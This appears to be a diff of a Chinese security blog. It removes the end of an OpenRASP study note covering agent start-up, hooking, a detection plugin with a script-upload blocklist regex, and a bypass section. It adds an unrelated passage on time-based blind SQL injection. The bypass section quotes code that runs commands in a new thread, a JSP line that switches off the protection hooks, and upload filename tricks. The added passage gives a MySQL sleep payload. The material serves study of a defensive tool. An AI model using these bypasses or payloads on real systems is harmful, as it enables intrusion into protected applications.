(com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">loadClassAndStartAgent:386, InstrumentationImpl (sun.instrument)</span><br><span class="line">loadClassAndCallPremain:401, InstrumentationImpl (sun.instrument)</span><br></pre></td></tr></table></figure>
-
-<p><code>loadConfigFromFile:207, Config (com.baidu.openrasp.config)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Config_loadConfigFromFile.png" alt></p>
-<p><code>loadConfig:125, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_loadConfig.png" alt></p>
-<h3 id="1-2-2-3-初始化插件系统"><a href="#1-2-2-3-初始化插件系统" class="headerlink" title="1-2-2-3 初始化插件系统"></a>1-2-2-3 初始化插件系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Initialize:66, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>Initialize:66, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_Initialize.png" alt></p>
-<h4 id="1-2-2-3-1-初始化传参变量"><a href="#1-2-2-3-1-初始化传参变量" class="headerlink" title="1-2-2-3-1 初始化传参变量"></a>1-2-2-3-1 初始化传参变量</h4><p>插件JS中，获取到的数据来源于V8引擎的传递，这里先对传递的一些参数变量进行初始化，其中server（系统环境变量）为全局静态保存的数据，parameter、header等则为根据请求动态获取的数据。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setKeys:39, Context (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:88, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>setKeys:39, Context (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Context_setKeys.png" alt></p>
-<h4 id="1-2-2-3-2-执行JS插件"><a href="#1-2-2-3-2-执行JS插件" class="headerlink" title="1-2-2-3-2 执行JS插件"></a>1-2-2-3-2 执行JS插件</h4><p>加载<code>plugins</code>目录下“.js”结尾的JS插件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UpdatePlugin:239, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">UpdatePlugin:218, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:90, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>UpdatePlugin:218, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_UpdatePlugin.png" alt></p>
-<h4 id="1-2-2-3-3-JS插件热部署"><a href="#1-2-2-3-3-JS插件热部署" class="headerlink" title="1-2-2-3-3 JS插件热部署"></a>1-2-2-3-3 JS插件热部署</h4><p>添加文件目录监控器，JS插件目录<code>plugins</code>的文件新增、修改、删除都会触发<code>UpdatePlugin</code>方法，更新JS插件。文件监控这块底层用的是第三方库<code>JnotifyWatcher</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">InitFileWatcher:243, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">Initialize:91, JS (com.baidu.openrasp.plugin.js)</span><br><span class="line">start:70, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>InitFileWatcher:243, JS (com.baidu.openrasp.plugin.js)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/JS_InitFileWatcher.png" alt></p>
-<h3 id="1-2-2-4-检测器初始化"><a href="#1-2-2-4-检测器初始化" class="headerlink" title="1-2-2-4 检测器初始化"></a>1-2-2-4 检测器初始化</h3><p>当Hook住一些方法后，调用对应检测器，检测器内的代码决定了后面如何进行安全检测，如可以直接在JAVA这边完成安全检测，或将检测逻辑交给JS插件。</p>
-<p>检测器初始化中，遍历已经初始化好的检测器JavaBean对象（封装了名称、id、检测方法），放到字典<code>checkers</code> 中以备后续使用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">init:34, CheckerManager (com.baidu.openrasp.plugin.checker)</span><br><span class="line">start:73, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>init:34, CheckerManager (com.baidu.openrasp.plugin.checker)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CheckerManager_init.png" alt></p>
-<h3 id="1-2-2-5-插桩"><a href="#1-2-2-5-插桩" class="headerlink" title="1-2-2-5 插桩"></a>1-2-2-5 插桩</h3><p><code>initTransformer</code>中，实例化<code>CustomClassTransformer</code>，该类实现了<code>ClassFileTransformer</code>接口（JVM TI接口）。其中的<code>restransform</code>方法用于遍历所有已经加载的类并进行插桩操作，而第一次加载的类直接使用<code>transform</code>方法。这里就不另外说明第一次加载的过程情况了，二者后续核心代码一致。可以分别尝试debug命令执行漏洞与XXE漏洞的hook方法来了解二者。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:76, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:134, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;init&gt;:76, CustomClassTransformer (com.baidu.openrasp.transformer)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_initTransformer.png" alt></p>
-<h4 id="1-2-2-5-1-获取hook点"><a href="#1-2-2-5-1-获取hook点" class="headerlink" title="1-2-2-5-1 获取hook点"></a>1-2-2-5-1 获取hook点</h4><p><code>CustomClassTransformer</code>在实例化时会获取相关Hook类。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addAnnotationHook:123, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">&lt;init&gt;:77, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:134, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>addAnnotationHook:123, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：获取<code>com.baidu.openrasp.hook</code>包下的<code>AbstractClassHook</code>子类，如果子类不是配置文件中忽略的hook（配置文件<code>Config.getConfig().getIgnoreHooks()</code>），则将该类放入私有成员<code>hooks</code>中（HashSet）。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_addAnnotationHook.png" alt></p>
-<p><code>&lt;init&gt;:77, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：实例化前与实例化所做的操作</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_construct.png" alt></p>
-<h4 id="1-2-2-5-2-过滤并hook"><a href="#1-2-2-5-2-过滤并hook" class="headerlink" title="1-2-2-5-2 过滤并hook"></a>1-2-2-5-2 过滤并hook</h4><p>对于已经被加载的类，会经由<code>retransform</code>方法到<code>transform</code>，而对于第一次加载的类，会直接被<code>transform</code>捕获，对于第一次加载的类这里不另外展现，到了<code>tranform</code>这里，对于<code>OpenRASP</code>来说，二者就没差别了。</p>
-<p><code>CustomClassTransformer</code>在实例化后，调用方法<code>retransform</code> -&gt; <code>transform</code>，方法中筛选需要hook的类后进行插桩操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">transform:188, TransformerManager (sun.instrument)</span><br><span class="line">transform:428, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses0:-1, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses:144, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:135, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</code>：CustomClassTransformer 实现了ClassFileTransformer接口，在transorm方法中，通过遍历<code>hooks</code>获取所有价值的Hook类，并通过Hook类的<code>isClassMatched</code>方法判断当前类是否Hook类的关注类，如果是，之后的具体操作则交由Hook类的<code>tranformClass</code>方法</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_transform.png" alt></p>
-<p><code>retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CustomClassTransformer_retransform.png" alt></p>
-<h4 id="1-2-2-5-2-1-Javassit实现hook"><a href="#1-2-2-5-2-1-Javassit实现hook" class="headerlink" title="1-2-2-5-2-1 Javassit实现hook"></a>1-2-2-5-2-1 Javassit实现hook</h4><p><code>hookMethod</code>中先通过``getInvokeStaticSrc<code>方法获取“桩”的JAVA代码，再调用</code>insertBefore`方法进行“插”的操作（使用Javassist），如插入在构造方法前，被hook的类在实例化前会调用该插入的方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hookMethod:69, FileOutputStreamHook (com.baidu.openrasp.hook.file)</span><br><span class="line">transformClass:83, AbstractClassHook (com.baidu.openrasp.hook)</span><br><span class="line">transform:155, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">transform:188, TransformerManager (sun.instrument)</span><br><span class="line">transform:428, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses0:-1, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransformClasses:144, InstrumentationImpl (sun.instrument)</span><br><span class="line">retransform:93, CustomClassTransformer (com.baidu.openrasp.transformer)</span><br><span class="line">initTransformer:135, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:74, EngineBoot (com.baidu.openrasp)</span><br><span class="line">start:78, ModuleContainer (com.baidu.openrasp)</span><br><span class="line">&lt;init&gt;:89, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">load:118, ModuleLoader (com.baidu.openrasp)</span><br><span class="line">init:94, Agent (com.baidu.openrasp)</span><br><span class="line">premain:71, Agent (com.baidu.openrasp)</span><br></pre></td></tr></table></figure>
-
-<p><code>hookMethod:69, FileOutputStreamHook (com.baidu.openrasp.hook.file)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FileOutoutStreamHook_hookMethod.png" alt></p>
-<p><code>transformClass:83, AbstractClassHook (com.baidu.openrasp.hook)</code>：调用在子类中重写的hookMethod</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/AbstractClassHook_transformClass.png" alt></p>
-<h3 id="1-2-2-6-云管理初始化"><a href="#1-2-2-6-云管理初始化" class="headerlink" title="1-2-2-6 云管理初始化"></a>1-2-2-6 云管理初始化</h3><p>如果配置了集中管理，这里会进行一个云管理的配置加载，好像还涉及到<code>IAST</code>技术，本文忽略。</p>
-<p><code>start:75, EngineBoot (com.baidu.openrasp)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/EngineBoot_start_Cloud.png" alt></p>
-<h3 id="2-请求处理"><a href="#2-请求处理" class="headerlink" title="2 请求处理"></a>2 请求处理</h3><p>这里以官方的文件上传为例，简要概述。</p>
-<p>文件上传的后缀名检测流程前会触发ApplicationFilterHook，但是这里最后调用的检测器是<code>request</code>，未看到该检测器的逻辑实现，应该是未起作用的，这里就不关注了。</p>
-<p>后面流程中，先触发FileUploadHook插桩于FileUploadBase的parseRequest方法前的cacheFileUploadParam方法，这里对当前HTTP请求做了解析并保存到HookHandler，不过这里的requestCache只有获取请求ID的作用，并没有用作检测判断的数据。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FileUploadHook_cacheFileUploadParam.png" alt></p>
-<p>之后触发HookHandler 的doRealCheckWithoutRequest，这里调用CheckManger.check进行文件后缀检测，底层走到了JS引擎。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/doRealCheckWithoutRequest_doRealCheckWithoutRequest.png" alt></p>
-<p>handleBlock用于加载自定义的HTTP响应页面，提示用户当前请求被识别为恶意请求，并向上抛安全异常，记录本次攻击事件。</p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HookHandler_handleBlock.png" alt></p>
-<p>JS中通过<code>pulgin.register</code>注册回调函数，而JAVA代码中通过调用native方法来调用该注册函数，获取是否判黑的结果。下面是文件上传部分JS代码，获取到的文件名后通过正则判断文件名是否非法，返回的JSON数据中指明action、message等消息即可：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> plugin  = <span class="keyword">new</span> RASP(plugin_name)</span><br><span class="line"><span class="keyword">var</span> algorithmConfig = &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">// 写文件操作 - NTFS 流</span></span><br><span class="line">    writeFile_NTFS: &#123;</span><br><span class="line">        name:   <span class="string">'算法1 - 拦截 NTFS ::$DATA 写入操作'</span>,</span><br><span class="line">        action: <span class="string">'block'</span></span><br><span class="line">    &#125;,</span><br><span class="line">        writeFile_script: &#123;</span><br><span class="line">        name:      <span class="string">'算法2 - 拦截 php/jsp 等脚本文件的写入操作'</span>,</span><br><span class="line">        reference: <span class="string">'https://rasp.baidu.com/doc/dev/official.html#case-file-write'</span>,</span><br><span class="line">        action:    <span class="string">'block'</span>,</span><br><span class="line">        userinput:  <span class="literal">true</span>,</span><br><span class="line">        lcs_search: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 配置挂载到全局 RASP 变量</span></span><br><span class="line">RASP.algorithmConfig = algorithmConfig</span><br><span class="line"><span class="keyword">const</span> clean = &#123;</span><br><span class="line">    action:     <span class="string">'ignore'</span>,</span><br><span class="line">    message:    <span class="string">'Looks fine to me'</span>,</span><br><span class="line">    confidence: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phtml|sh|py|pl|rb)\.?$/i</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br><span class="line">...</span><br><span class="line">plugin.register(<span class="string">'writeFile'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">params, context</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 写 NTFS 流文件，通常是为了绕过限制</span></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.writeFile_NTFS.action != <span class="string">'ignore'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ntfsRegex.test(params.realpath))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                action:     algorithmConfig.writeFile_NTFS.action,</span><br><span class="line">                message:    _(<span class="string">"File write - Writing NTFS alternative data streams"</span>, [params.realpath]),</span><br><span class="line">                confidence: <span class="number">95</span>,</span><br><span class="line">                algorithm:  <span class="string">'writeFile_NTFS'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h1 id="5-绕过分析"><a href="#5-绕过分析" class="headerlink" title="5.绕过分析"></a>5.绕过分析</h1><h3 id="5-1-已知手法"><a href="#5-1-已知手法" class="headerlink" title="5.1 已知手法"></a>5.1 已知手法</h3><p><a href="https://www.anquanke.com/post/id/195016" target="_blank" rel="noopener">多种姿势openrasp命令执行绕过</a>一文中，作者给出了两种命令执行的绕过手法</p>
-<p>①创建新线程，在新线程中进行命令执行，比如在spring中使用如下代码进行命令执行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"testCmd.do"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testCmd</span><span class="params">(<span class="keyword">final</span> String cmd)</span></span>&#123;</span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">    t.start();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"testCmd"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>②通过全局的Hook开关关闭rasp，如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;com.baidu.openrasp.HookHandler&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    HookHandler.enableHook.getAndSet(false);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>笔者的看法是，OpenRASP的目标应该是漏洞防护，漏洞防护也不能影响业务。如果存在业务的命令执行漏洞如①场景一致，那么应该确实是问题。另外被入侵成功后如何防护，对于该项目可能不是当前重点甚至意义不大。OpenRASP有后台管理（集中），不过目前看不到各主机的hook开关情况。</p>
-<h3 id="5-2-Hook点"><a href="#5-2-Hook点" class="headerlink" title="5.2 Hook点"></a>5.2 Hook点</h3><p>RASP核心是hook并插桩，如果有漏洞的类未被hook到或是hook的类非底层关键类，则该技术会被绕过。如在命令执行中，对于JAVA版本&lt;JDK8的，代码hook了<code>java.lang.ProcessImpl</code>与<code>java.lang.UNIXProcess</code>。此处只是一提，笔者对于这块没有发现绕过点。</p>
-<p><code>isClassMatched:65, ProcessBuilderHook (com.baidu.openrasp.hook.system)</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ProcessBuilderHook_isClassMatched.png" alt></p>
-<h3 id="5-3-规则缺陷"><a href="#5-3-规则缺陷" class="headerlink" title="5.3 规则缺陷"></a>5.3 规则缺陷</h3><p>OpenRASP还是不免用到了一些规则，如果规则未黑名单形式，比较难避免遗漏。如针对文件上传有文件后缀过滤正则，其中针对脚本文件的黑名单正则：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var scriptFileRegex &#x3D; &#x2F;\.(aspx?|jspx?|php[345]?|phtml|sh|py|pl|rb)\.?$&#x2F;i</span><br></pre></td></tr></table></figure>
-
-<p>使用官方的vulns.war中的<code>008 - 任意文件上传漏洞 - commons.io 方式</code>进行漏洞测试，在windows下上传文件名“test.jsp…”可成功上传。另外可以通过“../test.war”的方式成功上传war包到webapp目录下，但由于该漏洞案例写文件的Writer为字符流而非二进制流，所以上传后的war不能成功执行。</p>
-<h1 id="6-其他说明"><a href="#6-其他说明" class="headerlink" title="6.其他说明"></a>6.其他说明</h1><p>代码中<code>OpenRasp</code>使用的JS引擎还是V8，不符合官方文档所说的<code>Rhnio</code>引擎，后来在官方QQ群中，群主<code>c0de::bre@k</code>回应到：“是j2v8太慢，优化过的v8比rhino快很多，js兼容性也强”。</p>
-<h1 id="7-结语"><a href="#7-结语" class="headerlink" title="7.结语"></a>7.结语</h1><p>通篇学习下来，笔者认为，对于普通人来说，实践与维护RASP的难度对比传统WAF来说，省去了大量请求解析与解码的工作，且安全效果会比较显著，毕竟其深入嵌入产品代码。但方案比较狭隘，不同用户可能会有自己的hook需求与安全功能需求，另外语言的变化还会付出额外维护成本。而OpenRASP已经比较成熟，除了攻击检测外还支持安全基线检测、类库信息收集等功能，其JS插件也简单易上手（除了需要吐槽整坨代码写一个文件），还具备后台管理功能与IAST功能，令笔者意想不到的强大。</p>
-<p>另外打下广告，本人目前求职中，求职意向为web安全岗，一线城市皆可…</p>
-<p> 相关参考</p>
-<p><a href="https://rasp.baidu.com/doc/" target="_blank" rel="noopener">https://rasp.baidu.com/doc/</a> OpenRASP官方文档</p>
-<p><a href="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html</a> JVMTM Tool Interface</p>
-<p><a href="https://xz.aliyun.com/t/4290" target="_blank" rel="noopener">https://xz.aliyun.com/t/4290</a>  浅谈RASP技术攻防之基础篇  </p>
-<p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html" target="_blank" rel="noopener">https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html</a> 字节码增强技术探索</p>
-<p><a href="https://www.anquanke.com/post/id/187415" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187415</a> 浅谈RASP</p>
+<p>延迟型盲注，原理大致如下，当一个查询结果为真时，则让对端数据库等待一定时间返回，否则立即返回，等待的表现是浏览器未刷新，对端服务器未应答。</p>
+<p>MySQL、MSSQL 下，当查询结果为真时利用时间函数来进行休眠，而 Oracle 没有时间函数，所以 Oracle 下会通过查询大表、大数据来达到同样的目的，MySQL 下有：</p>
+<blockquote>
+<p>and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</p>
+</blockquote>
+<p>逻辑推理注入是十分花费时间的，不得不靠工具或是小脚本来完成。Sqlmap 中，可以通过 –<code>technique t</code>，直接指定基于时间的盲注来跑。</p>
